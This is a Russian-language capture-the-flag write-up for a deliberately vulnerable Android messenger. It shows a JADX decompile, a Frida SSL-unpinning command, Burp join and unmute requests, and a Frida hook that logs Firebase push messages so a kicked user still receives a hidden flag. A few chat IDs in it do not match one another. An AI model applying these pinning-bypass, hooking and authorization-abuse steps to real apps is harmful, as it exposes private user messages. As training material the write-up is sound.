# Write-up: MAXIMUM — Анализ FCM и обход ограничений чата

## Описание задачи
В данном задании нам представлено Android-приложение мессенджера. Цель — вступить в закрытый чат по инвайт-ссылке (deeplink) и получить конфиденциальную информацию (флаг).

**Входные данные:**

- Приложение: `MAXIMUM.apk`
- Ссылка на чат: `maximum://invite/ffa1b2c3-d4e5-f6a7-8b90-c123d456e789`

## Шаг 1. Статический анализ
Для начала декомпилируем APK с помощью **JADX**. В ходе исследования исходного кода в пакете `ru.alfactf.messenger.data` был обнаружен интерфейс `sources/ru/alfactf/messenger/data/ApiService.java`, описывающий взаимодействие с бэкендом:

```java
public interface ApiService {

    // ... сокращено ...

    @POST("/api/chats/{chatId}/join")
    Object joinChat(@Path("chatId") String str, Continuation<? super Response<Chat>> continuation);

    @POST("/api/chats/{chatId}/unmute")
    Object unmuteChat(@Path("chatId") String str, Continuation<? super Response<MuteResponse>> continuation);

    @PUT("/api/users/me/fcm-token")
    Object updateFcmToken(@Body UpdateFcmTokenRequest updateFcmTokenRequest, Continuation<? super Response<Map<String, Boolean>>> continuation);
}
```

## Шаг 2. Подготовка окружения
Для динамического анализа используем эмулятор с правами **root** и установленным **frida-server**.

1. Находим идентификатор приложения:
   ```bash
   frida-ps -Uai | grep alfa
   ```
2. Настраиваем **Burp Suite** для перехвата трафика, указав прокси в настройках эмулятора.

## Шаг 3. Обход SSL Pinning
При попытке запустить приложение через Frida `-f` (force spawn) обнаруживаем наличие SSL Pinning (трафик в Burp не отображается, приложение выдает ошибки соединения). Используем готовый скрипт из **frida-codeshare**:

```bash
frida -U -f ru.alfactf.messenger -c akabe1/frida-multiple-unpinning
```

## Шаг 4. Анализ логики вступления в чат
Регистрируемся в приложении и перехватываем запрос на вступление в чат. В качестве `chatId` используем идентификатор из инвайт-ссылки, полученной в условии задания.

**Запрос в Burp Suite:**
```http
POST /api/chats/ffa1b2c3-d4e5-f6a7-8b90-c123d456e78/join HTTP/1.1
Host: api.messenger.alfactf.ru
Authorization: Bearer <YOUR_TOKEN>
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
User-Agent: okhttp/4.12.0
```

**Ответ сервера:**
Мы получаем статус 200, однако в самом приложении мгновенно появляется сообщение: 
> *"К сожалению, все места в поход закончились, вы слишком поздно присоединились. Остальным: через минуту будут отправлены координаты точки сборки."*.

Сразу после этого нас исключают из чата. В HTTP-трафике больше ничего не происходит, флаг не приходит, что бы мы не делали в http.

## Шаг 5. Перехват FCM сообщений
Гипотеза: флаг приходит не через стандартный REST API, а через **Firebase Cloud Messaging**, и приложение не отображает его, так как пользователь уже «кикнут».

Напишем Frida-скрипт для перехвата метода `onMessageReceived` и логирования данных в консоль:

```javascript
Java.perform(function () {
    // Для перехвата fcm сообщений
    var svc = Java.use("com.google.firebase.messaging.FirebaseMessagingService");
    // Для нормального отображения в формате json 
    var JSONObject = Java.use("org.json.JSONObject");

    // Функия перехватывающая получатель сообщения
    svc.onMessageReceived.implementation = function (msg) {
        // Получаем данные
        var data = msg.getData();
        // Преобразуем [object Object] в json
        var json = JSONObject.$new(data);
        console.log("FCM MESSAGE:", json.toString());
        // Чтобы не ломать сервис вызываме реальный обработчик
        return this.onMessageReceived(msg);
    };
});
```

После чего подключимся к существуюшему процессу через frida:
```bash
frida -U -N ru.alfactf.messenger

# Загрузим fcm хук
# > load% fcm_hook.js
```

## Шаг 6. Обход Mute
После первой попытки `join` мы замечаем в ответе сервера состояние чата:
```json
{
    "id":"0c91c4ab-6ed4-47ce-b49d-810a8dbb8c9a",
    "name":"CTF Special Invite",
    "is_group":1,
    "is_kicked":1,
    "is_muted":1,
    "last_message":null,
    "last_message_at":null
},
```
Флаг `is_muted: 1` означает, что уведомления для этого чата принудительно отключены после кика. Чтобы FCM сообщение «пробилось» и обработалось, нам нужно немедленно отправить запрос на **unmute**.

**Важно:** Использовать нужно `chatId` из тела ответа (внутренний ID), а не тот, что был в ссылке.

1. Отправляем повторный запрос на `join`.
2. Сразу же отправляем запрос на `unmute`:

**Запрос на Unmute:**
```http
POST /api/chats/0c91c4ab-6ed4-47ce-b49d-810a8dbb8c9a/unmute HTTP/1.1
Host: api.messenger.alfactf.ru
Authorization: Bearer <YOUR_TOKEN>
```

## Шаг 7. Получение флага
Через некоторое время после «размучивания» чата в консоль Frida падает заветное сообщение:

```text
FCM MESSAGE: {
    "id":"b273d0c8-28ea-4343-bf19-3a813e303249",
    "text":"Ваша заявка на участие в походе рассмотрена. К сожалению, все места уже заняты.",
    "type":"message",
    "sender_id":"fca4a43a-3004-478d-b7e8-fa5aff549fd2","chat_id":"5ce14d4e-70cf-41a9-9bd4-6c8a392fc4ab","created_at":"2026-04-28T19:55:35.174599+00:00","sender_username":"Организатор"
}
FCM MESSAGE: {
    "type":"kicked",
    "chat_id":"5ce14d4e-70cf-41a9-9bd4-6c8a392fc4ab"
}
FCM MESSAGE: {
    "id":"25890199-efc3-4b3a-b038-1e6b6928e24b",
    "text":"координаты точки сборки: alfa{gR0up_ChAt_1DOr_M3S5EnG3r_PWN3D}",
    "type":"message",
    "sender_id":"fca4a43a-3004-478d-b7e8-fa5aff549fd2","chat_id":"5ce14d4e-70cf-41a9-9bd4-6c8a392fc4ab","created_at":"2026-04-28T19:56:05.179290+00:00","sender_username":"Организатор"
}
```

**Flag:** `alfa{gR0up_ChAt_1DOr_M3S5EnG3r_PWN3D}`

---

### Итог
В данной задаче была продемонстрирована уязвимость типа **IDOR** в сочетании с анализом скрытых каналов передачи данных. Несмотря на то, что UI скрывал сообщения для исключенных пользователей, клиентская часть всё равно получала и могла обрабатывать широковещательные push-уведомления.